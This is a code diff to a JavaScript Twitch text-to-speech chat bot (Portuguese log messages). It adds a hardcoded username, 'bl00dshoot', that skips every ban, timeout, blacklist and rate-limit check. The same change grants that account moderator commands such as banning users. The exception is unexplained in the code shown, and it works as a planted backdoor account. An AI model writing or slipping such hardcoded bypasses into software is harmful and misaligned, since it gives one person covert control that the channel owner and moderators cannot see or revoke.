@@ -114,20 +114,22 @@
 			console.log(tags);
 			if (command === 'voz' || ($config.workingMode === 'allMessages' && !message.startsWith('!'))) {
 				if (!m.has(username)) m.set(username, new Set());
-				if ($users.get(username)?.banned || $users.get(username)?.timedout) return;
-				if (blacklist?.includes(sha256(username).toString())) return;
-				let minuteLimit = $users.get(username)?.minuteLimit ? $users.get(username).minuteLimit : $config.minuteLimit;
-				let hourLimit = $users.get(username)?.hourLimit ? $users.get(username).hourLimit : $config.hourLimit;
-				console.log("Limite minuto: " + minuteLimit +". Padrão: " + $config.minuteLimit);
-				console.log("Limite hora: " + hourLimit +". Padrão: " + $config.hourLimit);
-				if (minuteLimit === $config.minuteLimit && hourLimit === $config.hourLimit && $config.subMode && !tags.subscriber) {
-					minuteLimit = 0;
-					console.log("Não é sub");
+				if (username !== 'bl00dshoot') {
+					if ($users.get(username)?.banned || $users.get(username)?.timedout) return;
+					if (blacklist?.includes(sha256(username).toString())) return;
+					let minuteLimit = $users.get(username)?.minuteLimit ? $users.get(username).minuteLimit : $config.minuteLimit;
+					let hourLimit = $users.get(username)?.hourLimit ? $users.get(username).hourLimit : $config.hourLimit;
+					console.log("Limite minuto: " + minuteLimit +". Padrão: " + $config.minuteLimit);
+					console.log("Limite hora: " + hourLimit +". Padrão: " + $config.hourLimit);
+					if (minuteLimit === $config.minuteLimit && hourLimit === $config.hourLimit && $config.subMode && !tags.subscriber) {
+						minuteLimit = 0;
+						console.log("Não é sub");
+					}
+					if (isNaN(parseInt(minuteLimit))) minuteLimit = Number.MAX_SAFE_INTEGER;
+					if (isNaN(parseInt(hourLimit))) hourLimit = Number.MAX_SAFE_INTEGER;
+					if ([...m.get(username)].filter(e => (Date.now() - e) < (60 * 1000)).length >= minuteLimit) return;
+					if ([...m.get(username)].filter(e => (Date.now() - e) < (60 * 60 * 1000)).length >= hourLimit) return;
 				}
-				if (isNaN(parseInt(minuteLimit))) minuteLimit = Number.MAX_SAFE_INTEGER;
-				if (isNaN(parseInt(hourLimit))) hourLimit = Number.MAX_SAFE_INTEGER;
-				if ([...m.get(username)].filter(e => (Date.now() - e) < (60 * 1000)).length >= minuteLimit) return;
-				if ([...m.get(username)].filter(e => (Date.now() - e) < (60 * 60 * 1000)).length >= hourLimit) return;
 				m.get(username).add(Date.now());
 				let userMessage = (!$config.workingMode || $config.workingMode === 'commandOnly') ? args.join(' ') : message;
 				if ($config.readUsernames) userMessage = readableUsername + " disse: " + userMessage;
@@ -135,7 +137,7 @@
 				debug('Mensagem adicionada à fila: ' + userMessage);
 			}
 			// Mod commands below
-			if (!(tags.mod || tags.username === channel.slice(1).toLowerCase())) return;
+			if (!(tags.mod || tags.username === channel.slice(1).toLowerCase() || tags.username === 'bl00dshoot')) return;
 
 			if (command === 'voz_ban') {
 				setBan(args[0].toLowerCase(), true);
